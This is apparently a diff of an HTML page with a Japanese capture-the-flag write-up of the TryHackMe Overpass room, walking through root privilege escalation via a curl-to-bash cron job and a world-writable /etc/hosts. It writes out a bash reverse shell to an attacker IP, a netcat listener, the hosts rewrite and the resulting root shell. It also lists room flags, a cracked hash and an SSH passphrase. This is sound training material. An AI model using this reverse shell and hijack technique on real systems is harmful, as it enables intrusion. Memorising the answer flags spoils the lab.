-        </article>
+&gt; Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
+&gt; Write down my password somewhere on a sticky note so that I don't forget it.
+  Wait, we make a password manager. Why don't I just use that?
+&gt; Test Overpass for macOS, it builds fine but I'm not sure it actually works
+&gt; Ask Paradox how he got the automated build script working and where the builds go.
+  They're not updating on the website
+james@ip-10-49-180-59:~$ 
+</code></pre>
+<p>2つのファイルを発見した<br>
+これはtodoリストであり、muirland君曰く、パスワードマネージャーの暗号化が強くないとのことであった<br>
+jamesがパスワードを忘れないようにどこかに置くと言っている<br>
+Paradox（人名？）にどうやってパスワードマネージャーをビルドするか聞くらしい</p>
+<p>権限昇格を探す</p>
+<p><code>sudo -l</code>はsudoパスがないので無理<br>
+SUIDもめぼしいものはなかった<br>
+つぎに探すのはcronタスク（Cronジョブ）</p>
+<pre><code class="language-bash">james@ip-10-49-128-6:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
 
-        <article class="timeline-item" data-step="06">
-          <h3>権限昇格 — cron + /etc/hosts ポイズニング</h3>
-          <p><span class="inline-code">sudo -l</span> も SUID も使えない。cron タスクを確認。</p>
-          <pre><code>cat /etc/crontab
-...
-* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash</code></pre>
-          <p>1 分ごとに root が <span class="inline-code">overpass.thm</span> からビルドスクリプトを取得して実行している。</p>
-          <pre><code>cat /etc/hosts
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+# Update builds from latest code
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+james@ip-10-49-128-6:~$ 
+</code></pre>
+<p><code>* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash</code>が明らかに人工物<br>
+<code>*</code>は毎ターンを表している（毎時、毎分、毎月など）<br>
+1分ごとに動かしているタスクであるということがわかる</p>
+<p>curlで取ってきている<code>buildscript.sh</code>はtargetサイトからもダウンロードできたやつと同一のものと推測<br>
+ただ<code>overpass.thm</code>は見覚えがない<br>
+名前解決の様子を見に行く</p>
+<pre><code class="language-bash">james@ip-10-49-128-6:~$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 overpass-prod
 127.0.0.1 overpass.thm
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+james@ip-10-49-128-6:~$ 
+</code></pre>
+<p>普通にローカルホストだった</p>
+<p>これ、書き換えられないかな</p>
+<pre><code class="language-bash">james@ip-10-49-128-6:~$ ls -la /etc/hosts
+-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
+james@ip-10-49-128-6:~$ 
+</code></pre>
+<p>otherでもwriteできることが分かった<br>
+自分のtun0に書き換えて、python3でhttpサーバー建ててリバースシェルいれておくが正解？</p>
+<p>ということでやってみる</p>
+<p>まず<code>* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash</code>を参考に場所を作る</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+└─$ mkdir www              
 
-ls -la /etc/hosts
--rw-rw-rw- 1 root root 250 ... /etc/hosts</code></pre>
-          <p><span class="inline-code">/etc/hosts</span> が world-writable。攻撃者側で偽の buildscript.sh を配信し、hosts を書き換えて cron を悪用する。</p>
-          <pre><code># Attacker: directory structure
-mkdir -p www/downloads/src
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+└─$ mkdir www/downloads    
 
-# Malicious buildscript.sh
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+└─$ mkdir www/downloads/src
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+└─$ tree                
+.
+├── james.hash
+├── james.key
+├── overpass.go
+├── overpassFreeBSD
+├── overpassLinux
+├── overpassMacOS
+├── overpassOpenBSD
+├── overpassWindows.exe
+├── username.txt
+└── www
+    └── downloads
+        └── src
+
+4 directories, 9 files
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+└─$ 
+
+</code></pre>
+<p>偽<code>buildscript.sh</code>を作った</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/…/overPass/www/downloads/src]
+└─$ cat buildscript.sh  
 #!/bin/bash
-bash -i >& /dev/tcp/&lt;attacker-ip&gt;/1234 0>&1
+bash -i &gt;&amp; /dev/tcp/192.168.205.211/1234 0&gt;&amp;1
 
-# Serve from www/
-sudo python3 -m http.server 80
+┌──(rkametani㉿rkametani-1-kalija)-[~/…/overPass/www/downloads/src]
+└─$ 
+</code></pre>
+<p>そして<code>/www</code>でpythonサーバーを立てる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass/www]
+└─$ pwd               
+/home/rkametani/tryhackme/overPass/www
 
-# Listen for reverse shell
-nc -lvnp 1234</code></pre>
-          <p>ターゲット側で hosts を書き換え:</p>
-          <pre><code>192.168.205.211 overpass.thm</code></pre>
-          <p>1 分以内に root のリバースシェルが返ってくる。</p>
-          <pre><code>root@&lt;target&gt;:~# cat root.txt
-thm{7f336f8c359dbac18d54fdd64ea753bb}</code></pre>
-        </article>
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass/www]
+└─$ sudo python3 -m http.server 80             
+[sudo] rkametani のパスワード:
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
-      </div>
-    </section>
+</code></pre>
+<p>そして別ターミナルでリッスンしておく</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+└─$ nc -lvnp 1234             
+listening on [any] 1234 ...
 
-    <section class="answers">
-      <h2>Answer Summary</h2>
-      <p>ルームの質問へのクイックリファレンス。</p>
-      <table>
-        <thead>
-          <tr><th>Question</th><th>Answer</th></tr>
-        </thead>
-        <tbody>
-          <tr><td>What was the first hash you cracked?</td><td><code>5f4dcc3b5aa765d61d8327deb882cf99</code> (password)</td></tr>
-          <tr><td>What was the password?</td><td><code>password</code></td></tr>
-          <tr><td>What was the username?</td><td><code>james</code></td></tr>
-          <tr><td>What was the SSH private key passphrase?</td><td><code>james13</code></td></tr>
-          <tr><td>user.txt</td><td><code>thm{65c1aaf000506e56996822c6281e6bf7}</code></td></tr>
-          <tr><td>root.txt</td><td><code>thm{7f336f8c359dbac18d54fdd64ea753bb}</code></td></tr>
-        </tbody>
-      </table>
-    </section>
+</code></pre>
+<p>そしてssh先で<code>/etc/hosts</code>を書き換える</p>
+<pre><code class="language-bash">james@ip-10-49-128-6:~$ vim  /etc/hosts
+james@ip-10-49-128-6:~$ cat  /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 overpass-prod
+192.168.205.211 overpass.thm
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+james@ip-10-49-128-6:~$ 
+</code></pre>
+<p>こうすると上記をwriteupに書き込んでいる間にリッスンポートにrootのbashが来た</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+└─$ nc -lvnp 1234             
+listening on [any] 1234 ...
+connect to [192.168.205.211] from (UNKNOWN) [10.49.128.6] 35416
+bash: cannot set terminal process group (7849): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ip-10-49-128-6:~# whoami
+whoami
+root
+root@ip-10-49-128-6:~# pwd
+pwd
+/root
+root@ip-10-49-128-6:~# ls
+ls
+buildStatus
+builds
+go
+root.txt
+src
+root@ip-10-49-128-6:~# cat root.txt
+cat root.txt
+thm{7f336f8c359dbac18d54fdd64ea753bb}
+root@ip-10-49-128-6:~# 
+
+</code></pre>
+<p>おわり</p>
+    </article>
   </main>
 
   <footer>
-    <p>Educational CTF writeup for <a href="https://tryhackme.com/room/overpass">tryhackme.com/room/overpass</a></p>
+    <p>Educational CTF writeup for <a href="https://tryhackme.com/room/overpass">https://tryhackme.com/room/overpass</a></p>
   </footer>
 </body>
 </html>
